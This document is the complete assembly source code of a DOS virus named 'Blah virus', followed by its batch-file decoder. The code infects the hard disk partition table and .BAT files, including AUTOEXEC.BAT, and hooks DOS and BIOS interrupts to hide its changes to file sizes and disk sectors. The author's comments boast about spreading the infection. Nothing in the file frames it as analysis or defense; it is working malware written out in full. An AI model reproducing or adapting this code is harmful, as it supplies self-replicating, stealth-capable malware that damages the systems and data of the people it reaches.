		.model  tiny
		.code
		.radix  16

		org     0
our_buffer      label   byte

		org     80
line            label   byte

		org     100

viruslength     = (heap-blah)*2+endcleanup-decoder+((heap-blah+1f)/20)*0f
resK            = (end_all - our_buffer + 3ff) / 400
resP            = resK * 40
sector_length   = (heap - blah + 1ff) / 200

blah:           xor     bp,bp
		xor     si,si

		cmp     [si],20CDh              ; check if there is a PSP
		jz      in_com                  ; to see if we are in COM or
						; boot (don't just check SP
						; since COM might not load in
						; a full segment if memory is
						; sparse)
		inc     bp

; hey! we're in the boot sector or the partition table
; assume in partition table for the time being
		push    si
		cli
		pop     ss
		mov     sp,-2                   ; doesn't really matter
		sti

		mov     ax,200 + sector_length
		mov     es,si
		mov     bx,7c00 + 200
		mov     cx,2
		mov     dx,80
		int     13

		mov     dx,0f800

		db      0ea
		dw      offset install, 7b0

in_com:         mov     dx,0f904

		mov     ah,62                   ; get the PSP
		int     21                      ; also tells existing copies
						; to disable themselves
						; (for NetWare compatability)
		dec     bx                      ; go to MCB so we can
		mov     ds,bx                   ; twiddle with it

		sub     word ptr [si+3],resP    ; reserve two K of memory
		sub     word ptr [si+12],resP   ; in DOS for the virus

install:        mov     cs:init_flag,dl
		mov     byte ptr cs:i13_patch,dh

		mov     ds,si                   ; reserve two K of memory
		mov     dx,word ptr ds:413
		sub     dx,resK
		mov     word ptr ds:413,dx      ; from the BIOS count
		mov     cl,6
		shl     dx,cl                   ; K -> paragraph

		les     ax,ds:84
		mov     cs:old_i21,ax
		mov     cs:old_i21+2,es

		les     ax,ds:4c
		mov     cs:old_i13,ax
		mov     cs:old_i13+2,es

		mov     es,dx
		push    cs
		pop     ds
		mov     si,offset blah
		mov     di,si
		mov     cx,(offset end_zopy - blah + 1) / 2
		rep     movsw

		mov     es,cx

		mov     es:4c,offset i13
		mov     es:4e,dx

		or      bp,bp
		jz      exit_com

exit_boot:      mov     ax,201                  ; read the original partition
		xor     cx,cx                   ; table to 0:7C00
		mov     dx,80                   ; since the i13 handler is in
		mov     es,cx                   ; place, we can load from where
		inc     cx                      ; the partition table should
		mov     bx,7c00                 ; be, instead of where it
		pushf
		push    es bx                   ; actually is
		jmp     dword ptr [bp+4bh]      ; int 13 / iret

exit_com:       mov     es:84,offset i21
		mov     es:86,dx

infect_hd:      push    ax cx dx bx ds es

		push    cs cs
		pop     es ds

		mov     ax,201
		mov     bx,100 + (sector_length*200)
		mov     cx,1
		mov     dx,80
		call    call_i13                ; get original partition table

		adj_ofs = (100 + (sector_length*200))

		cmp     word ptr cs:[adj_ofs+decoder-blah],'e@'
		jz      already_infected

		mov     al,ds:[adj_ofs+1C0]
		cbw
		or      ax,ds:[adj_ofs+1C2]
		jnz     enough_room
		cmp     byte ptr ds:[adj_ofs+1C1],sector_length+1
		jbe     already_infected        ; not enough room for virus

enough_room:    mov     ax,301 + sector_length  ; write to disk
		mov     bx,100                  ; cx = 1, dx = 80 already
		call    call_i13

already_infected:
		pop     es ds bx dx cx ax
		ret

		db      'Blah virus',0
		db      '(DA/PS)',0

; I indulged myself in writing the decoder; it's rather much larger than it
; needs to be. This was so I could insert random text strings into the code.
; The decoder creates a file which, when run, will execute the encoded file.
; In this case, we are encoding the virus. See the beginning for a complete
; explanation of how the virus works.
decoder         db      '@echo øPSBAT!ø¿PS½'
fsize           dw      -1 * (heap - blah)
		db      'XYZ÷ÝU¾S¹  2é¬H‹Ø¬,AÃªMtâñít­ëå>',0ba,'.com',0Dh,0A
		db      '@echo ¸üü2àYP—¸ó¤«¸ëë2à«¾PS¿DBïDAÃ'
endline:        db      '>>',0ba,'.com',0Dh,0A
; The next line is to ease the coding. This way, the same number of statements
; pass between the running of the temporary program and the reloading of the
; batch file for both AUTOEXEC.BAT on bootup and regular batch files. Running
; the temporary file installs the virus into memory. Note the following lines
; are never seen by the command interpreter if the virus is already resident.
enddecoder:     db      '@if %0. == . ',0ba,0Dh,0A
		db      '@',0ba,0Dh,0A
		db      '@del ',0ba,'.com',0Dh,0A
; The next line is necessary because autoexec.bat is loaded with %0 == NULL
; by COMMAND.COM. Without this line, the virus could not infect AUTOEXEC.BAT,
; which would be a shame.
		db      '@if %0. == . autoexec',0Dh,0A
		db      '@%0',0Dh,0A
endcleanup:

chain_i13:      push    [bp+6]
		call    dword ptr cs:old_i13
		pushf
		pop     [bp+6]
		ret

call_i13:       pushf
		call    dword ptr cs:old_i13
		ret

write:          mov     ah,40
calli21:        pushf
		call    dword ptr cs:old_i21
		ret

check_signature:and     word ptr es:[di+15],0
		push    es di cs cs
		pop     ds es
		mov     ah,3f
		cwd                             ; mov dx,offset our_buffer
		mov     cx,enddecoder - decoder
		call    calli21

		cld
		mov     si,offset decoder
		mov     di,dx
		mov     cx,enddecoder - decoder
		rep     cmpsb

		pop     di es
		ret


i13:            clc                             ; this is patched to
		jnc     i13_patch               ; disable the i13 handler
		jmp     disabled_i13            ; this is a stupid hiccup

i13_patch:      clc                             ; this is patched to once
		jc      multipartite_installed  ; i21 is installed

		push    ax bx ds es

		mov     ax,0AA55                ; offset 02FE of the virus
						; this is the PT signature

		xor     ax,ax
		mov     es,ax

		lds     bx,es:84
		mov     ax,ds
		cmp     ax,cs:old_i21+2
		jz      not_DOS_yet
		or      ax,ax                   ; Gets set to address in zero
		jz      not_DOS_yet             ; segment temporarily. ignore.
		cmp     ax,800
		ja      not_DOS_yet
		cmp     ax,es:28*4+2            ; make sure int 28 handler
		jnz     not_DOS_yet             ; the same (OS == DOS?)
		cmp     bx,cs:old_i21
		jz      not_DOS_yet
install_i21:    push    cs
		pop     ds
		mov     ds:old_i21,bx
		mov     ds:old_i21+2,ax
		mov     es:84,offset i21
		mov     es:86,cs
		inc     byte ptr ds:i13_patch
not_DOS_yet:    pop     es ds bx ax
multipartite_installed:
		push    bp
		mov     bp,sp

		cmp     cx,sector_length + 1    ; working on virus area?
		ja      jmp_i13

		cmp     dx,80
		jnz     jmp_i13

		cmp     ah,2                    ; reading partition table?
		jz      stealth_i13
not_read:       cmp     ah,3                    ; write over partition table?
		jnz     jmp_i13
		call    infect_hd

		push    si cx bx ax

		mov     al,1

		cmp     cl,al                   ; are we working on partition
		jnz     not_write_pt            ; table at all?

		mov     cx,sector_length + 1
		call    chain_i13
		jc      alt_exit_i13

not_write_pt:   pop     ax
		push    ax

		cbw
		sub     al,sector_length + 2    ; calculate number of remaining
		add     al,cl                   ; sectors to write
		js      alt_exit_i13
		jz      alt_exit_i13

		push    cx
		sub     cx,sector_length + 2    ; calculate number of sectors
		neg     cx                      ; skipped
addd:           add     bh,2                    ; and adjust buffer pointer
		loop    addd                    ; accordingly
		pop     cx

		or      ah,1                    ; ah = 1 so rest_stealth makes
		jmp     short rest_stealth      ; it a write

jmp_i13:        pop     bp
disabled_i13:   jmp     dword ptr cs:old_i13

stealth_i13:    push    si cx bx ax
		call    infect_hd

		mov     si,bx

		mov     al,1

		cmp     cl,al
		jnz     not_read_pt

		mov     cx,sector_length + 1
		call    chain_i13
		jc      alt_exit_i13

		add     bh,2                            ; adjust buffer ptr

not_read_pt:    pop     ax
		push    ax
		push    di ax
		mov     di,bx
		mov     ah,0
		add     al,cl

		cmp     al,sector_length + 2
		jb      not_reading_more
		mov     al,sector_length + 2
not_reading_more:cmp    cl,1
		jnz     not_pt
		dec     ax
not_pt:         sub     al,cl
		jz      dont_do_it                      ; resist temptation!

		mov     cl,8
		shl     ax,cl                           ; zero out sectors
		mov     cx,ax
		cbw                                     ; clear ax
		rep     stosw
		mov     bx,di                           ; adjust buffer

dont_do_it:     pop     ax di
		mov     ah,0

		mov     cl,9
		sub     si,bx
		neg     si
		shr     si,cl
		sub     ax,si
		jz      alt_exit_i13

rest_stealth:   sub     ax,-200
		mov     cx,sector_length + 2
		call    chain_i13

alt_exit_i13:   pop    bx
		mov    al,bl
		pop    bx cx si bp
		iret

i24:            mov     al,3
		iret

chain_i21:      push    [bp+6]                  ; push flags on stack again
		call    dword ptr cs:old_i21
		pushf                           ; put flags back onto caller's
		pop     [bp+6]                  ; interrupt stack area
		ret

infect_bat:     mov     cx,200                  ; conquer the holy batch file!
move_up:        sub     bp,cx
		jns     $+6
		add     cx,bp
		xor     bp,bp
		mov     es:[di+15],bp           ; move file pointer

		mov     ah,3f                   ; read in portion of the file
		mov     dx,offset big_buffer
		call    calli21

		add     word ptr es:[di+15],viruslength
		sub     word ptr es:[di+15],ax
		call    write                   ; move the data up

		or      bp,bp
		jnz     move_up

move_up_done:   mov     word ptr es:[di+15],bp  ; go to start of file

		mov     cx,enddecoder - decoder
		mov     dx,offset decoder
		call    write

		push    es di cs
		pop     es

		mov     bp,heap - blah
		mov     si,offset blah
encode_lines:   mov     di,offset line
		mov     cx,20
encode_line:    lodsb
		push    ax
		and     ax,0F0
		inc     ax
		stosb
		pop     ax
		and     ax,0F
		add     al,'A'
		stosb
		dec     bp
		jz      finished_line
		loop    encode_line

finished_line:  mov     cx,6
		mov     dx,offset decoder
		call    write

		mov     cx,di
		mov     dx,offset line
		sub     cx,dx
		call    write

		mov     cx,enddecoder-endline
		mov     dx,offset endline
		call    write

		or      bp,bp
		jnz     encode_lines

		pop     di es

		mov     cx,endcleanup - enddecoder
		mov     dx,offset enddecoder
		call    write

		ret

; check neither extension nor timestamp in case file was renamed or
; something like that

; will hang without this stealth because of the line
; @%0 that it adds to batch files
handle_read:    push    es di si ax cx dx ds bx

		xor     si,si

		cmp     cs:init_flag,0
		jnz     dont_alter_read

		mov     ax,1220
		int     2f
		jc      dont_alter_read

		xor     bx,bx
		mov     bl,es:di
		mov     ax,1216
		int     2f                      ; es:di now -> sft
		jc      dont_alter_read

		pop     bx                      ; restore the file handle
		push    bx

		push    es:[di+15]              ; save current offset

		call    check_signature
		mov     si,viruslength
		pop     bx
		jz      hide_read
		xor     si,si
hide_read:      add     bx,si
		mov     es:[di+15],bx
dont_alter_read:pop     bx ds dx cx ax

		call    chain_i21

		sub     es:[di+15],si

		pop     si di es
_iret:          pop     bp
		iret

handle_open:    cmp     cs:init_flag,0
		jz      keep_going
		dec     cs:init_flag
keep_going:     call    chain_i21
		jc      _iret
		push    ax cx dx bp si di ds es

		xchg    si,ax                   ; filehandle to si

		mov     ax,3524
		int     21
		push    es bx                   ; save old int 24 handler

		xchg    bx,si                   ; filehandle back to bx
		push    bx
		mov     si,dx                   ; ds:si->filename

		push    ds
		mov     ax,2524                 ; set new int 24 handler
		push    cs
		pop     ds
		mov     dx,offset i24
		call    calli21
		pop     ds

		cld

find_extension: lodsb                           ; scan filename for extension
		or      al,al                   ; no extension?
		jz      dont_alter_open
		cmp     al,'.'                  ; extension?
		jnz     find_extension

		lodsw                           ; check if it's .bat
		or      ax,2020
		cmp     ax,'ab'
		jnz     dont_alter_open
		lodsb
		or      al,20
		cmp     al,'t'
		jnz     dont_alter_open

		mov     ax,1220                 ; if so, get jft entry
		int     2f
		jc      dont_alter_open

		xor     bx,bx
		mov     bl,es:di
		mov     ax,1216                 ; now get SFT
		int     2f
		jc      dont_alter_open

		pop     bx                      ; recover file handle
		push    bx

		mov     bp,word ptr es:[di+11]  ; save file size
		or      bp,bp
		jz      dont_alter_open

		mov     byte ptr es:[di+2],2    ; change open mode to r/w
		mov     ax,word ptr es:[di+0dh] ; get file time
		and     ax,not 1f               ; set the seconds field
		or      ax,1f
		mov     word ptr es:[di+0dh],ax

		call    check_signature
		jz      dont_alter1open         ; infected already!

		call    infect_bat

dont_alter1open:or      byte ptr es:[di+6],40   ; set flag to set the time
		and     word ptr es:[di+15],0
		mov     byte ptr es:[di+2],0    ; restore file open mode
dont_alter_open:pop     bx dx ds
		mov     ax,2524
		call    calli21
		pop     es ds di si bp dx cx ax bp
		iret

findfirstnext:  call    chain_i21               ; standard file length
		push    ax bx si ds es          ; hiding
		cmp     al,-1
		jz      dont_alter_fffn

		mov     ah,2f                   ; get the DTA to es:bx
		int     21
		push    es
		pop     ds
		cmp     byte ptr [bx],-1
		jnz     not_extended
		add     bx,7
; won't hide if extension is changed, but otherwise gives it away by disk
; accesses
not_extended:   cmp     word ptr [bx+9],'AB'
		jnz     dont_alter_fffn
		cmp     byte ptr [bx+0bh],'T'
		jnz     dont_alter_fffn
		cmp     word ptr [bx+1dh],viruslength
		jb      dont_alter_fffn
		mov     al,[bx+17]
		and     al,1f
		cmp     al,1f
		jnz     dont_alter_fffn
		and     byte ptr [bx+17],not 1f
		sub     word ptr [bx+1dh],viruslength
dont_alter_fffn:pop     es ds si bx ax bp
		iret

inst_check:     cmp     bx,0f904
		jnz     jmp_i21
		push    si di cx
		mov     si,offset blah
		mov     di,100
		mov     cx,offset i13 - offset blah
		db      2e
		rep     cmpsb
		jnz     not_inst

		inc     byte ptr cs:i13         ; disable existing copy of
		inc     byte ptr cs:i21         ; the virus

not_inst:       pop     si di cx
		jmp     short jmp_i21
i21:            clc
		jc      disabled_i21
		push    bp
		mov     bp,sp
		cmp     ah,11
		jz      findfirstnext
		cmp     ah,12
		jz      findfirstnext
		cmp     ah,62
		jz      inst_check
		cmp     ax,3d00
		jnz     not_open
		jmp     handle_open
not_open:       cmp     ah,3f
		jnz     jmp_i21
		jmp     handle_read


jmp_i21:        pop     bp
disabled_i21:   db      0ea                     ; call original int 21
heap: ; g
old_i21         dw      ?, ?                    ; handler
old_i13         dw      ?, ?
init_flag       db      ?

end_zopy:
		org     100 + ((end_zopy - blah + 1ff) / 200) * 200
orig_PT         db      200 dup (?)
big_buffer      db      200 dup (?)
end_all:

		end     blah

; The complimentary decoder included with every copy of blah

		.model  tiny
		.code
		.radix  16
		org     100

decode:         db      'øPSBAT!ø'      ; translates to some random code

		mov     di,offset buffer
		db      0bdh    ; mov bp, datasize
datasize        dw      'Y0'

		db      'XYZ'           ; more text that is also code

		neg     bp
		push    bp
		mov     si,offset databytes
keep_going:     mov     cx,2020
		xor     ch,cl
decode_line:    lodsb
		dec     ax              ; tens digit
		mov     bx,ax
		lodsb
		sub     al,'A'
		add     ax,bx
		stosb

		dec     bp
		jz      all_done
		loop    decode_line
all_done:       or      bp,bp
		jz      no_more
		lodsw                   ; skip CRLF
		jmp     keep_going

		db      0Dh,0A          ; split file into two lines

no_more:        mov     ax,0fcfc
		xor     ah,al
		pop     cx              ; how many bytes to move
		push    ax
		xchg    ax,di
		mov     ax,0a4f3
		stosw
		mov     ax,0ebebh       ; flush prefetch queue
		xor     ah,al
		stosw

		mov     si,offset buffer
		mov     di,100 + 4144
		sub     di,'AD'

		retn

		db      0Dh,0Ah         ; split the file s'more

databytes:

		org     5350            ; 50/53 == P/S
buffer:

		end     decode
